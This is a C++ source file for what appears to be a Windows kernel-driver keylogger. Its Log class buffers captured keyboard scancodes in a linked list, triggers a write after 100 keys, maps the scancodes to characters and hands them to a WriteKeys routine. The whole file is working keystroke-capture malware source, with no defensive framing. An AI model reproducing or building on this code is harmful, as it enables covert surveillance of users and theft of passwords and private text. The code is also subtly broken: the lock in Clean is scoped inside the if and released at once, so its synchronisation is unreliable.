#include <main.h>


void Log::Init()
{
	Lock.Init();
	KeyCount = 0;
	Keys = nullptr;
}

void Log::Clean(bool TakeLock)
{
	if(TakeLock)
		AutoLock<SpinLock> lock(Lock);
	if (!Keys)
		return; 
	PKEY_DATA current = Keys;
	PKEY_DATA temp;
	while (current != nullptr)
	{
		temp = current->Next;
		delete current;
		current = temp;
	}
	KeyCount = 0;
	Keys = nullptr;
}

void Log::Append(USHORT MakeCode, USHORT Flags)
{
	PKEY_DATA NewKey = new(NonPagedPool, TAG) KEY_DATA;
	if (!NewKey)
		return;
	NewKey->Flags = Flags;
	NewKey->MakeCode = MakeCode;
	NewKey->Next = nullptr;
	AutoLock<SpinLock> lock(Lock);
	KeyCount++;
	if (!Keys)
	{
		Keys = NewKey;
		return;
	}
	PKEY_DATA Current = Keys;
	while (Current->Next != nullptr)
	{
		Current = Current->Next;
	}
	Current->Next = NewKey;
	if (KeyCount == 100)
		WriteSignal = true;

}

void Log::Write()
{
	MAPPED_KEY MappedKey ;
	NTSTATUS status;
	int SizeOfKeysRead = 0;
	Lock.Lock();

	PKEY_DATA Current = Keys;
	if (!Keys)
	{
		DbgPrint("[*] no keys to write\n");
		Lock.Unlock();
		return;
	}
	// calculate size of keys read 
	while (Current != nullptr)
	{
		MappedKey = MapScancode(Current);
		SizeOfKeysRead += MappedKey.SizeOfKey;
		Current = Current->Next;
	}
	// allocate buffer for keys 
	PUCHAR Buffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, SizeOfKeysRead * sizeof(UCHAR), TAG);
	if (!Buffer)
	{
		Lock.Unlock();
		return;
	}
	
	// fill buffer with keys 
	PUCHAR InitBuffer = Buffer;
	Current = Keys;
	while (Current != nullptr)
	{
		MappedKey = MapScancode(Current);
		RtlCopyMemory(InitBuffer, MappedKey.MappedKey, MappedKey.SizeOfKey);
		InitBuffer = (PUCHAR)((ULONG_PTR)InitBuffer + (MappedKey.SizeOfKey * sizeof(UCHAR)));
		Current = Current->Next;
	}
	// clean the recording whilst still holding the lock
	Recording.Clean(false);
	Lock.Unlock();

	WriteKeys(Buffer, sizeof(UCHAR) * SizeOfKeysRead);

	ExFreePoolWithTag(Buffer, TAG); 


}